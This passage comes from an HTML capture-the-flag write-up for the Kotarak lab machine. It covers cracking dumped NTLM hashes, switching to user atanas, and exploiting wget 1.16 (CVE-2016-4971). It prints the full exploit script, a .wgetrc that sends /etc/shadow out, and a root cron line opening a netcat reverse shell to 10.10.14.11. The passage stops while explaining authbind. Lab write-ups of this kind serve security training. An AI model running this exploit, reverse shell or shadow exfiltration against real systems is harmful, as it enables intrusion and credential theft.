+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">awk</span>&nbsp;-F&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#3ad900;font-weight:400">'{print&nbsp;$4}'</span>&nbsp;secretsdump.txt&nbsp;&gt;&nbsp;hashdump.txt<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;hashdump.txt&nbsp;<br>
+                e64fe0f24ba2489c05e64354d74ebd11<br>
+                31d6cfe0d16ae931b73c59d7e0c089c0<br>
+                668d49ebfdb70aeee8bcaeac9e3e66fd<br>
+                ca1ccefcb525db49828fbb9d68298eee<br>
+                160f6c1db2ce0994c19c46a349611487<br>
+                6f5e87fd20d1d8753896f6c9cb316279<br>
+                cdd7a7f43d06b3a91705900a592f3772<br>
+                24473180acbcc5f7d2731abe05cfa88c<br>
+                2b576acbe6bcfda7294d6bd18041b8fe
+            </div>
+        </div><br>
+        <br>
+        Crack the hashes with hashkiller.co.uk - <a href="https://hashkiller.co.uk/Cracker/NTLM">https://hashkiller.co.uk/Cracker/NTLM</a><br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        2 results!<br>
+        <code>Administrator / f16tomcat!</code> and <code>atanas / Password123!</code><br>
+        <br>
+        As <code>tomcat</code>, you can <code>su</code> (switch user) to <code>atanas</code> with <code>f16tomcat!</code>.<br>
+            <div class="codebox">
+                tomcat@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;atanas&nbsp;<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;f16tomcat<span style="color:#ff9d00;font-weight:700">!</span><br>
+                <br>
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~&nbsp;&nbsp;&nbsp;<br>
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                93f844f50491ef797c9c1b601b4bece8
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>6) /root/app.log</strong></h2><br>
+        Search for files owned by <code>atanas</code>.<br>
+        There are 3 interesting results - <code>/root/flag.txt</code>, <code>/root/app.log</code>, and <code>/usr/bin/authbind</code>.<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-user&nbsp;atanas&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-v&nbsp;proc<br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>flag.txt<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>app.log<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.bashrc<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.profile<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.cache<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.cache<span style="color:#ff9d00;font-weight:700">/</span>motd.legal-displayed<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.bash_logout<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.bash_history<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.sudo_as_admin_successful<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>atanas<span style="color:#ff9d00;font-weight:700">/</span>.nano<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>[...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>authbind
+            </div>
+        </div><br>
+        <br>
+        It appears we can read the contents of <code>/root</code>.<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>flag.txt<br>
+                Getting&nbsp;closer<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;But&nbsp;what&nbsp;you&nbsp;are&nbsp;looking&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">can</span>'t&nbsp;be&nbsp;found&nbsp;here.
+            </div>
+        </div><br>
+        <br>
+        But no flag :/<br>
+        As the mentions, it's somewhere else.<br>
+        <br>
+        Check <code>/root/app.log</code>.<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>root$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;app.log<br>
+                10.0.3.133&nbsp;-&nbsp;-&nbsp;[20<span style="color:#ff9d00;font-weight:700">/</span>Jul<span style="color:#ff9d00;font-weight:700">/</span>2017<span style="color:#ff9d00;font-weight:700">:</span>22<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;-0400]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/archive.tar.gz&nbsp;HTTP/1.1"</span>&nbsp;404&nbsp;503&nbsp;<span style="color:#3ad900;font-weight:400">"-"</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Wget/1.16&nbsp;(linux-gnu)"</span><br>
+                10.0.3.133&nbsp;-&nbsp;-&nbsp;[20<span style="color:#ff9d00;font-weight:700">/</span>Jul<span style="color:#ff9d00;font-weight:700">/</span>2017<span style="color:#ff9d00;font-weight:700">:</span>22<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;-0400]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/archive.tar.gz&nbsp;HTTP/1.1"</span>&nbsp;404&nbsp;503&nbsp;<span style="color:#3ad900;font-weight:400">"-"</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Wget/1.16&nbsp;(linux-gnu)"</span><br>
+                10.0.3.133&nbsp;-&nbsp;-&nbsp;[20<span style="color:#ff9d00;font-weight:700">/</span>Jul<span style="color:#ff9d00;font-weight:700">/</span>2017<span style="color:#ff9d00;font-weight:700">:</span>22<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;-0400]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/archive.tar.gz&nbsp;HTTP/1.1"</span>&nbsp;404&nbsp;503&nbsp;<span style="color:#3ad900;font-weight:400">"-"</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Wget/1.16&nbsp;(linux-gnu)"</span>
+            </div>
+        </div><br>
+        <br>
+        <code>app.log</code> looks like the output of <code>python -m SimpleHTTPServer</code>.<br>
+        <code>10.0.3.133</code> is connecting to us and trying to download <code>archive.tar.gz</code> every 2 minutes.<br>
+        <br>
+        However, it's trying to do it using an old version of <code>wget</code> - version 1.16.<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>7) wget exploit</strong></h2><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;searchsploit&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span><br>
+                ---------------------------------------------------&nbsp;--------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;URL<br>
+                ---------------------------------------------------&nbsp;--------------------------------------------<br>
+                GNU&nbsp;Wget&nbsp;1.x&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>24813<br>
+                GNU&nbsp;Wget&nbsp;&lt;&nbsp;1.18&nbsp;-&nbsp;Access&nbsp;List&nbsp;Bypass&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Race&nbsp;Condit&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>40824<br>
+                GNU&nbsp;Wget&nbsp;&lt;&nbsp;1.18&nbsp;-&nbsp;Arbitrary&nbsp;File&nbsp;Upload&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Remote&nbsp;C&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>40064<br>
+                [...]<br>
+            </div>
+        </div><br>
+        <br>
+        1.16 is vulnerable to remote code execution :)<br>
+        <a href="https://www.exploit-db.com/exploits/40064">https://www.exploit-db.com/exploits/40064</a><br>
+        <br>
+        Summary of the exploit<br>
+        • Create an ftp directory and put a <code>.wgetrc</code> file in it<br>
+        • Start a web and ftp server on your attacking host (kotarak)<br>
+        • Run <code>wget-exploit.py</code><br>
+        • Wait for the victim to <code>wget</code> a file from your attacking host (kotarak)<br>
+        • The provided <code>wget-exploit.py</code> scripts responds with a 302, redirecting the victim's request to a <code>.wgetrc</code> file in the attacker's FTP server<br>
+        • The <code>.wgetrc</code> gets downloaded to the victim machine. This <code>.wgetrc</code> file modifies the startup commands of wget, so that when wget next starts up it sends over <code>/etc/shadow</code> and sets up a root cron job (we'll specify a reverse shell) to run every minute<br>
+        • Start a listener on the attacking host to receive the root cron job reverse shell<br>
+        • Wait 1 minute for the root cron job to run, and the attacker will have a reverse shell as root on the victim host<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>7a) Set up FTP</strong></h3><br>
+        Set up an FTP directory and write the <code>.wgetrc</code> file.<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span><br>
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span>$&nbsp;vi&nbsp;.wgetrc<br>
+                post_file&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>shadow<br>
+                output_document&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron.d<span style="color:#ff9d00;font-weight:700">/</span>wget-root-shell
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>7b) Modify exploit script</strong></h3><br>
+        Modify the <code>wget-exploit.py</code> script<br>
+        • Change <code>HTTP_LISTEN_IP = '192.168.57.1'</code> to <code>HTTP_LISTEN_IP = '0.0.0.0'</code><br>
+        ◇ <code>10.10.10.55</code> doesn't work, and neither does <code>127.0.0.1</code>.<br>
+        ◇ <code>0.0.0.0</code> means ‘listen on every available interface’.<br>
+        • Change <code>FTP_HOST = '192.168.57.1'</code> to <code>FTP_HOST = '10.10.10.55'</code><br>
+        • Change the ROOT_CRON variable to a reverse shell<br>
+        ◇ <code>ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 9005 &gt;/tmp/f \n"</code><br>
+        <br>
+        Here's what my <code>wget-exploit.py</code> script looked like:<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Wget&nbsp;1.18&nbsp;&lt;&nbsp;Arbitrary&nbsp;File&nbsp;Upload&nbsp;Exploit</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Dawid&nbsp;Golunski</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;dawid(&nbsp;at&nbsp;)legalhackers.com</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;CVE-2016-4971&nbsp;</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;SimpleHTTPServer<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;SocketServer<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;socket;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">class</span>&nbsp;wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_GET(<span style="color:#333333;font-weight:400">self</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;This&nbsp;takes&nbsp;care&nbsp;of&nbsp;sending&nbsp;.wgetrc</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"We&nbsp;have&nbsp;a&nbsp;volunteer&nbsp;requesting&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#333333;font-weight:400">self</span>.path&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;by&nbsp;GET&nbsp;:)\n"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Wget"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#333333;font-weight:400">self</span>.headers.getheader(<span style="color:#3ad900;font-weight:400">'User-Agent'</span>):<br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"But&nbsp;it's&nbsp;not&nbsp;a&nbsp;Wget&nbsp;:(&nbsp;\n"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_response(<span style="color:#ff0044;font-weight:400">200</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.end_headers()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.wfile.write(<span style="color:#3ad900;font-weight:400">"Nothing&nbsp;to&nbsp;see&nbsp;here..."</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Uploading&nbsp;.wgetrc&nbsp;via&nbsp;ftp&nbsp;redirect&nbsp;vuln.&nbsp;It&nbsp;should&nbsp;land&nbsp;in&nbsp;/root&nbsp;\n"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_response(<span style="color:#ff0044;font-weight:400">301</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_path&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'%s'</span>%(<span style="color:#3ad900;font-weight:400">'ftp://anonymous@%s:%s/.wgetrc'</span>%(FTP_HOST,&nbsp;FTP_PORT)&nbsp;)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Sending&nbsp;redirect&nbsp;to&nbsp;%s&nbsp;\n"</span>%(new_path)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_header(<span style="color:#3ad900;font-weight:400">'Location'</span>,&nbsp;new_path)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.end_headers()<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">def</span>&nbsp;do_POST(<span style="color:#333333;font-weight:400">self</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;In&nbsp;here&nbsp;we&nbsp;will&nbsp;receive&nbsp;extracted&nbsp;file&nbsp;and&nbsp;install&nbsp;a&nbsp;PoC&nbsp;cronjob</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"We&nbsp;have&nbsp;a&nbsp;volunteer&nbsp;requesting&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#333333;font-weight:400">self</span>.path&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;by&nbsp;POST&nbsp;:)\n"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Wget"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#333333;font-weight:400">self</span>.headers.getheader(<span style="color:#3ad900;font-weight:400">'User-Agent'</span>):<br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"But&nbsp;it's&nbsp;not&nbsp;a&nbsp;Wget&nbsp;:(&nbsp;\n"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_response(<span style="color:#ff0044;font-weight:400">200</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.end_headers()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.wfile.write(<span style="color:#3ad900;font-weight:400">"Nothing&nbsp;to&nbsp;see&nbsp;here..."</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content_len&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(<span style="color:#333333;font-weight:400">self</span>.headers.getheader(<span style="color:#3ad900;font-weight:400">'content-length'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_body&nbsp;=&nbsp;<span style="color:#333333;font-weight:400">self</span>.rfile.read(content_len)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Received&nbsp;POST&nbsp;from&nbsp;wget,&nbsp;this&nbsp;should&nbsp;be&nbsp;the&nbsp;extracted&nbsp;/etc/shadow&nbsp;file:&nbsp;\n\n---[begin]---\n&nbsp;%s&nbsp;\n---[eof]---\n\n"</span>&nbsp;%&nbsp;(post_body)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Sending&nbsp;back&nbsp;a&nbsp;cronjob&nbsp;script&nbsp;as&nbsp;a&nbsp;thank-you&nbsp;for&nbsp;the&nbsp;file..."</span>&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"It&nbsp;should&nbsp;get&nbsp;saved&nbsp;in&nbsp;/etc/cron.d/wget-root-shell&nbsp;on&nbsp;the&nbsp;victim's&nbsp;host&nbsp;(because&nbsp;of&nbsp;.wgetrc&nbsp;we&nbsp;injected&nbsp;in&nbsp;the&nbsp;GET&nbsp;first&nbsp;response)"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_response(<span style="color:#ff0044;font-weight:400">200</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.send_header(<span style="color:#3ad900;font-weight:400">'Content-type'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'text/plain'</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.end_headers()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">self</span>.wfile.write(ROOT_CRON)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\nFile&nbsp;was&nbsp;served.&nbsp;Check&nbsp;on&nbsp;/root/hacked-via-wget&nbsp;on&nbsp;the&nbsp;victim's&nbsp;host&nbsp;in&nbsp;a&nbsp;minute!&nbsp;:)&nbsp;\n"</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span><br>
+                <br>
+                HTTP_LISTEN_IP&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'0.0.0.0'</span><br>
+                HTTP_LISTEN_PORT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br>
+                FTP_HOST&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.10.55'</span><br>
+                FTP_PORT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">21</span><br>
+                <br>
+                ROOT_CRON&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"*&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;rm&nbsp;/tmp/f;mkfifo&nbsp;/tmp/f;cat&nbsp;/tmp/f|/bin/sh&nbsp;-i&nbsp;2&gt;&amp;1|nc&nbsp;10.10.14.11&nbsp;9005&nbsp;&gt;/tmp/f&nbsp;\n"</span><br>
+                <br>
+                handler&nbsp;=&nbsp;SocketServer.TCPServer((HTTP_LISTEN_IP,&nbsp;HTTP_LISTEN_PORT),&nbsp;wgetExploit)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Ready?&nbsp;Is&nbsp;your&nbsp;FTP&nbsp;server&nbsp;running?"</span><br>
+                <br>
+                sock&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br>
+                result&nbsp;=&nbsp;sock.connect_ex((FTP_HOST,&nbsp;FTP_PORT))<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;result&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"FTP&nbsp;found&nbsp;open&nbsp;on&nbsp;%s:%s.&nbsp;Let's&nbsp;go&nbsp;then\n"</span>&nbsp;%&nbsp;(FTP_HOST,&nbsp;FTP_PORT)<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>:<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"FTP&nbsp;is&nbsp;down&nbsp;:(&nbsp;Exiting."</span><br>
+                &nbsp;&nbsp;&nbsp;exit(<span style="color:#ff0044;font-weight:400">1</span>)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Serving&nbsp;wget&nbsp;exploit&nbsp;on&nbsp;port&nbsp;%s...\n\n"</span>&nbsp;%&nbsp;HTTP_LISTEN_PORT<br>
+                <br>
+                handler.serve_forever()
+            </div>
+        </div><br>
+        <br>
+        Write or transfer your <code>wget-exploit.py</code> script to Kotarak (I just used vi and copy/pasted).<br>
+            <div class="codebox">
+                atanas@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/ftp</span>$&nbsp;vi&nbsp;wget-exploit.py<br>
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Wget&nbsp;1.18&nbsp;&lt;&nbsp;Arbitrary&nbsp;File&nbsp;Upload&nbsp;Exploit</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>7c) Start FTP and run exploit script</strong></h3><br>
+        When listing atanas's files, <code>authbind</code> was listed.<br>
+        <code>authbind</code> allows us to start services on privileged ports<br>
